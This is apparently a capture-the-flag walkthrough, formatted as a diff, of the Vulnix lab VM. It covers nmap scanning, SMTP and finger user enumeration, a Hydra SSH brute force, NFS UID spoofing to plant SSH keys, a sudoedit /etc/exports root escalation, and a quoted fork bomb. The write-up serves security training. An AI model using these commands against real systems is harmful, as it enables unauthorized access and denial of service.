@@ -1,0 +1,242 @@
+First, we need to see what the IP of the box is. In order to do this, we can perform a ping sweep of our host-only network and see what responds. As you can see from the output below, it appears that our target IP address is 192.168.56.105.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sP 192.168.56.0/24
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 16:46 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.1
+Host is up (0.00016s latency).
+MAC Address: 0A:00:27:00:00:0B (Unknown)
+Nmap scan report for 192.168.56.100
+Host is up (0.00021s latency).
+MAC Address: 08:00:27:F3:D2:81 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.56.105
+Host is up (0.00060s latency).
+MAC Address: 08:00:27:01:3D:75 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.56.102
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 1.83 seconds
+Next, we need to see what services are listening on the box. In order to do this, we can run a Nmap TCP scan which performs banner grabs on all ports. As you can see we have a number of services such as SSH, SMTP, Finger and NFS.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sC -sV -sT -p0- 192.168.56.105
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 16:47 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.105
+Host is up (0.00017s latency).
+Not shown: 65519 closed tcp ports (conn-refused)
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 
+25/tcp    open  smtp     Postfix smtpd
+|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, 
+79/tcp    open  finger   Debian fingerd
+110/tcp   open  pop3     Dovecot pop3d
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+143/tcp   open  imap     Dovecot imapd
+512/tcp   open  exec     netkit-rsh rexecd
+513/tcp   open  login    OpenBSD or Solaris rlogind
+514/tcp   open  shell    Netkit rshd
+993/tcp   open  ssl/imap Dovecot imapd
+995/tcp   open  ssl/pop3 Dovecot pop3d
+2049/tcp  open  nfs_acl  2-3 (RPC #100227)
+MAC Address: 08:00:27:01:3D:75 (Oracle VirtualBox virtual NIC)
+Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.30 seconds
+
+
+Vulnix SMTP User Enumeration
+We can see port 25 is open so we can use this to enumerate users using the VRFY command. There are a number of tools that can perform this enumeration. Nmap has an NSE script that can enumerate users but there are also independent Python and Perl scripts as well as a Metasploit module. We’re going to use the meta sploit module and set the RHOSTS to the IP address of the target.
+
+msf6 auxiliary(scanner/smtp/smtp_enum) > set rhosts 192.168.56.105
+msf6 auxiliary(scanner/smtp/smtp_enum) > exploit
+[*] 192.168.56.105:25     - 192.168.56.105:25 Banner: 220 vulnix ESMTP Postfix 
+[+] 192.168.56.105:25     - 192.168.56.105:25 Users found: User, Vulnix, backup, bin, daemon, games, gnats, irc, landscape, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, syslog, user, user, uucp, vulnix, whoopsie, www-data
+[*] 192.168.56.105:25     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+Vulnix Finger Enumeration
+We know from the Nmap scan that the Finger service is listening. This service should also allow us to enumerate users. We already have a good wordlist from the SMTP user enumeration but lets enumerate Finger to get as much information out of Vulnix as possible.
+
+msf6 auxiliary(scanner/finger/finger_users) > set rhosts 192.168.56.105
+msf6 auxiliary(scanner/finger/finger_users) > exploit
+[+] 192.168.56.105:79     - 192.168.56.105:79 Users found: backup, bin, daemon, dovecot, dovenull, games, gnats, irc, landscape, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, proxy, root, sshd, sync, sys, syslog, user, uucp, vulnix, whoopsie, www-data
+[*] 192.168.56.105:79     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+SSH Brute Force
+Now that we have a good list of users, we can attempt to brute force SSH in order to gain access to the host. To do this we will use the THC Hydra brute forcing tool with our usernames wordlist and the rockyou password list.
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ sudo hydra -V -L users.txt -P rockyou.txt 192.168.56.105 ssh -t 4                                                                            
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 415987542 login tries (l:29/p:14344398), ~103996886 tries per task
+[DATA] attacking ssh://192.168.56.105:22/
+[ATTEMPT] target 192.168.56.105 - login "User" - pass "123456" - 1 of 415987542
+
+srmitage.txt
+NFS Enumeration
+While Hydra is running we can continue probing the services on the box for more information. Our Nmap scan showed us that the Network File Service or NFS Service was listening. We can use a tool called showmount to see if there are any exports or shares available.
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ sudo showmount -e 192.168.56.105                   
+Export list for 192.168.56.105:
+/home/vulnix *
+Based on the information from showmount we can attempt to mount the /home/vulnix mount that we found. However, when we try to list out the contents of /mnt/vulnix, we get a permission denied error.
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ sudo mkdir /mnt/vulnix 
+┌──(kali㉿kali)-[~/Documents]
+└─$ sudo mount 192.168.56.105:/home/vulnix /mnt/vulnix -o vers=3
+┌──(kali㉿kali)-[~/Documents]
+└─$ ls /mnt/vulnix        
+ls: cannot open directory '/mnt/vulnix': Permission denied
+The mount command I used above mounts the NFS share using an older version. The reason for this is so that we can see the Username and UID. While we don’t have permission to see the contents of the directory, we can still see the directory. You can see below that the UID is 2008. You can also so that the username is vulnix.
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ ls -lash /mnt         
+total 52K
+4.0K drwxr-xr-x  4 root   root   4.0K May  7 16:36 .
+ 40K drwxr-xr-x 19 root   root    36K Apr 26 11:40 ..
+4.0K drwxr-x---  4 vulnix vulnix 4.0K May  7 15:39 vulnix
+┌──(kali㉿kali)-[~/Documents]
+└─$ ls -laShn /mnt                                              
+total 52K
+drwxr-xr-x 19    0    0  36K Apr 26 11:40 ..
+drwxr-xr-x  4    0    0 4.0K May  7 16:36 .
+drwxr-x---  4 2008 2008 4.0K May  7 15:39 vulnix
+Vulnix Foothold
+A common misconfiguration in NFS allows us to create a user with the same username and same UID to access the files.
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ sudo adduser -u 2008 vulnix
+Now if we switch users to the vulnix user we should be able to list the contents of the NFS share.
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ su vulnix                   
+Password: 
+┌──(vulnix㉿kali)-[/home/kali/Documents]
+└─$ ls -laSh /mnt/vulnix
+total 32K
+drwxr-x--- 4 vulnix vulnix 4.0K May  7 15:39 .
+drwxr-xr-x 4 root   root   4.0K May  7 16:36 ..
+drwx------ 2 vulnix vulnix 4.0K May  7 15:23 .cache
+-rw-r--r-- 1 vulnix vulnix 3.5K Apr  3  2012 .bashrc
+-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
+-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
+-rw------- 1 vulnix vulnix   94 May  7 16:35 .bash_history
+Next, we need to make a .ssh directory on /mnt/vulnix so that we can copy a public key across and use it to access the machine.
+
+┌──(vulnix㉿kali)-[/home/kali/Documents]
+└─$ mkdir /mnt/vulnix/.ssh
+Next, we generate the SSH key that we are going to copy across and use to access the server. However, as this box is quite old and modern systems no longer supper ssh-rsa, we need to specify that method.
+
+┌──(vulnix㉿kali)-[/home/kali/Documents]
+└─$ ssh-keygen -t ssh-rsa
+Generating public/private ssh-rsa key pair.
+Now that we have our private and public keys, we can copy our public key onto the mount point. We need to copy it into the .ssh directory with the name authorized_keys.
+
+┌──(vulnix㉿kali)-[~]
+└─$ cp .ssh/id_rsa.pub /mnt/vulnix/.ssh/authorized_keys
+We can now SSH to the box using our private key and it should allow us to log in as the vulnix user. However, as with creating the key, we need to tell our SSH client to accept the old ssh-rsa algorithm.
+
+┌──(vulnix㉿kali)-[~]
+└─$ ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa  vulnix@192.168.56.105                                                                                                               
+Warning: Identity file id_rsa not accessible: No such file or directory.
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+ * Documentation:  https://help.ubuntu.com/
+  System information as of Sat May  7 22:22:42 BST 2022
+  System load:  0.0              Processes:           92
+  Usage of /:   90.3% of 773MB   Users logged in:     1
+  Memory usage: 1%               IP address for eth0: 192.168.56.105
+  Swap usage:   0%
+  => / is using 90.3% of 773MB
+  Graph this data and manage this system at https://landscape.canonical.com/
+Last login: Sat May  7 21:24:35 2022 from 192.168.56.102
+vulnix@vulnix:~$
+Privilege Escalation
+We now have SSH access to the box as the user vulnix. We still need to root the box though. The first thing to do is to see whether we have sudo.
+
+vulnix@vulnix:~$ sudo -ll
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User vulnix may run the following commands on this host:
+Sudoers entry:
+    RunAsUsers: root
+    Commands:
+        sudoedit /etc/exports
+    RunAsUsers: root
+    Commands:
+        NOPASSWD: sudoedit /etc/exports
+It would appear that we have limited sudo access which allows us to sudoedit /etc/exports without a password. The /etc/exports file is what we use to configure NFS. This file allows us to specify which parts of the filesystem are accessible to the public. Here we can configure the root user’s home directory as an NFS share.
+
+vulnix@vulnix:~$ sudoedit /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/vulnix    *(rw,root_squash)
+/root           *(rw,no_root_squash)
+In order to make the changes, we need to hard reboot the machine. This isn’t the best option as we don’t have permission to run a reboot and we may not have physical access to the server. Unfortunately, this is the only option we have at this stage. We could run a fork bomb ((){ :|:& };:) to exhaust the resources on the system and force it to reboot but we will just reboot it.
+
+Vulnix Getting root
+Once the system has rebooted, we can run the showmout tool again to see if the root user’s home directory has been shared.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo showmount -e 192.168.56.105 
+Export list for 192.168.56.105:
+/root        *
+/home/vulnix *
+Fantastic, the root user’s home directory has been shared. We should now be able to make another directory and mount it.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo mkdir /mnt/vulnroot
+┌──(kali㉿kali)-[~]
+└─$ sudo mount 192.168.56.105:/root /mnt/vulnroot -o vers=3
+┌──(kali㉿kali)-[~]
+└─$ sudo ls -laSh /mnt/vulnroot                            
+total 36K
+drwx------ 4 root root 4.0K May  7 16:40 .
+drwxr-xr-x 4 root root 4.0K May  7 16:36 ..
+drwx------ 2 root root 4.0K Sep  2  2012 .cache
+-rw-r--r-- 1 root root 3.1K Apr 19  2012 .bashrc
+-rw------- 1 root root  710 Sep  2  2012 .viminfo
+-rw-r--r-- 1 root root  140 Apr 19  2012 .profile
+-r-------- 1 root root   33 Sep  2  2012 trophy.txt
+-rw------- 1 root root   18 May  7 16:28 .bash_history
+With the root user’s home directory mounted, we can now repeat the process of copying an SSH public key into the authorized_keys file. First, we need to create the .ssh directory. Next, we need to create a new SSH key pair (ensuring to specify the rsa-ssh type). After that, we have to copy the public key to the SSH directory and call it authorized_keys.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo mkdir /mnt/vulnroot/.ssh 
+┌──(kali㉿kali)-[~/Documents]
+└─$ ssh-keygen -t ssh-rsa        
+Generating public/private ssh-rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa):
+┌──(kali㉿kali)-[~]
+└─$ sudo cp .ssh/id_rsa.pub /mnt/vulnroot/.ssh/authorized_keys
+Finally, we can see to the box as root and capture the trophy… although we could have captured it when we mounted the NFS share. Wheres the fun in that.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i .ssh/id_rsa  root@192.168.56.105
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+ * Documentation:  https://help.ubuntu.com/
+  System information as of Sat May  7 22:37:31 BST 2022
+  System load:  0.0              Processes:           93
+  Usage of /:   90.3% of 773MB   Users logged in:     2
+  Memory usage: 1%               IP address for eth0: 192.168.56.105
+  Swap usage:   0%
+  => / is using 90.3% of 773MB
+  Graph this data and manage this system at https://landscape.canonical.com/
+Last login: Sat May  7 21:42:13 2022 from 192.168.56.102
+root@vulnix:~# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
